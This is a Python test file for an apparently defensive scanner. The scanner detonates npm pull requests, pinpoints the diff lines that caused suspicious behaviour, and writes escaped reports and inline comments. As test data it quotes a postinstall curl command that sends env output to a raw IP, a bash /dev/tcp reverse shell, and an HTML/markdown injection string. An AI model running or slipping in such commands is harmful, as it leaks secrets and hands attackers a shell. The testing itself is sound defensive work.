import json
from pathlib import Path

from brain.github_client import ChangedFile
from brain.pinpoint import MAX_GUILTY_LINES, added_lines, find_guilty_lines, lifecycle_script
from brain.rules import RuleHit, Severity, evaluate
from shared.contract import DetonateResult, ExecEvent

FIXTURES = Path(__file__).parent / "fixtures"


def result(name: str) -> DetonateResult:
    return DetonateResult.model_validate_json((FIXTURES / f"detonate_real_{name}.json").read_text())


def files(name: str) -> list[ChangedFile]:
    raw = json.loads((FIXTURES / f"pr_files_{name}.json").read_text())
    return [ChangedFile.model_validate(f) for f in raw]


def guilty(name: str):
    res = result(name)
    return find_guilty_lines(evaluate(res), res, files(name))


def test_added_lines_track_head_line_numbers():
    patch = "@@ -1,3 +1,4 @@\n a\n-b\n+B\n+C\n c\n@@ -10,2 +11,2 @@\n x\n+y"
    assert added_lines(patch) == [(2, "B"), (3, "C"), (12, "y")]


def test_added_lines_skip_no_newline_marker():
    patch = '@@ -1 +1,2 @@\n-{}\n\\ No newline at end of file\n+{\n+  "a": 1'
    assert added_lines(patch) == [(1, "{"), (2, '  "a": 1')]


def test_e4_points_at_the_postinstall_line():
    lines = guilty("e4")
    assert [(g.path, g.line) for g in lines] == [("package.json", 5)]
    g = lines[0]
    assert '"postinstall"' in g.code
    assert {"EXEC_NET_TOOL", "NET_RAW_IP"} <= set(g.rule_ids)


def test_e5_points_at_the_script_line_and_the_spawn_in_the_file_it_ran():
    lines = guilty("e5")
    assert [(g.path, g.line) for g in lines] == [
        ("package.json", 5),
        ("scripts/telemetry-optout.js", 8),
    ]
    assert "cp.spawn" in lines[1].code and lines[1].reason == "runs a process"


def test_lifecycle_script_strips_tetragon_quotes_and_takes_npms_shell():
    # E5: bash -c (spawned by the script's node) must not be mistaken for npm's sh -c.
    res = result("e5")
    bash = next(e for e in res.exec_events if e.binary.endswith("/bash"))
    assert lifecycle_script(bash.pid, res.exec_events) == "node scripts/telemetry-optout.js"


def test_e4_script_with_inner_quotes_round_trips():
    res = result("e4")
    curl = next(e for e in res.exec_events if e.binary.endswith("/curl"))
    assert lifecycle_script(curl.pid, res.exec_events) == (
        'curl -s -m 5 -X POST --data-binary "$(env)" http://203.0.113.10/collect || true'
    )


def test_low_hits_never_pinpoint():
    res = result("e4")
    low = [RuleHit(h.rule_id, Severity.LOW, h.evidence, h.ts, h.pid) for h in evaluate(res)]
    assert find_guilty_lines(low, res, files("e4")) == []


def test_script_from_a_dependency_does_not_blame_the_prs_own_script():
    # Same process tree, but the PR's postinstall is something else: no exact match, no blame.
    other = files("e4")
    other[1] = other[1].model_copy(
        update={"patch": other[1].patch.replace("curl -s -m 5", "echo hi; curl -s -m 9")}
    )
    res = result("e4")
    assert all(g.reason == "contains the address it connected to" for g in
               find_guilty_lines(evaluate(res), res, other))  # fmt: skip


def test_process_loops_terminate():
    loop = [
        ExecEvent(ts="t", pid=1, ppid=2, binary="/bin/sh", args="-c x", parent_binary="node",
                  uid=1),
        ExecEvent(ts="t", pid=2, ppid=1, binary="/usr/bin/node", args="", parent_binary="sh",
                  uid=1),
    ]  # fmt: skip
    assert lifecycle_script(1, loop) == "x"


def test_capped():
    res = result("e5")
    patch = "@@ -0,0 +1,9 @@\n" + "\n".join(f"+spawn({i}) 203.0.113.10" for i in range(9))
    many = [ChangedFile(filename=f"f{i}.js", status="added", patch=patch) for i in range(5)]
    assert len(find_guilty_lines(evaluate(res), res, many)) == MAX_GUILTY_LINES


# --- wiring: model prompt, report, inline comment ---

from brain.github_client import PrMetadata  # noqa: E402
from brain.llm import LlmOutcome, LlmVerdict  # noqa: E402
from brain.pipeline import analyze  # noqa: E402
from brain.report import render_line_comment  # noqa: E402

META = PrMetadata(
    title="Opt out of telemetry",
    body="",
    author="x",
    changed_files=["package.json", "scripts/telemetry-optout.js"],
    package_json_changed=True,
    scripts_changed=True,
    lockfile_changed=False,
)


def verdict(**extra) -> LlmVerdict:
    return LlmVerdict(verdict="malicious", confidence=0.95, stated_intent="s",
                      observed_behavior="o", mismatch=True, explanation="e", **extra)  # fmt: skip


def test_pipeline_sends_guilty_lines_to_the_model_and_reports_them():
    sent = {}

    def llm(metadata, hits, result, diff, contract=None, guilty=None):
        sent["guilty"] = guilty
        return LlmOutcome("m", verdict=verdict(line_explanations=[
            {"id": 1, "explanation": "Decodes base64 to `bash -i >& /dev/tcp/203.0.113.10/4444`"}
        ]))  # fmt: skip

    out = analyze(result("e5"), META, "", llm, job_id="j", enrich=lambda r: r, files=files("e5"))
    assert [g["path"] for g in sent["guilty"]] == ["package.json", "scripts/telemetry-optout.js"]
    assert out.final.title == "Blocked" and len(out.guilty) == 2
    assert "### Where it came from" in out.report
    assert "What it does" in out.report and "203&#46;0&#46;113&#46;10" in out.report


def test_no_guilty_lines_means_no_section_and_no_prompt_block():
    sent = {}

    def llm(*args, guilty=None):
        sent["guilty"] = guilty
        return LlmOutcome("m", error="x")

    out = analyze(result("e5"), META, "", llm, job_id="j", enrich=lambda r: r, files=[])
    assert sent["guilty"] is None and "Where it came from" not in out.report


def test_inline_comment_is_escaped_and_names_the_rules():
    g = guilty("e5")[1]
    hostile = "[click](https://evil.example) @maintainer <img src=x>"
    body = render_line_comment(
        g,
        1,
        LlmOutcome("m", verdict=verdict(line_explanations=[{"id": 1, "explanation": hostile}])),
        result("e5"),
    )
    assert "`EXEC_INTERACTIVE_SHELL`" in body
    assert "](" not in body and "@maintainer" not in body and "<img" not in body
    assert "bash" in body  # process chain shown


def test_old_model_output_without_line_explanations_still_parses():
    v = verdict()
    assert v.line_explanations == [] and v.line_explanation(0) is None
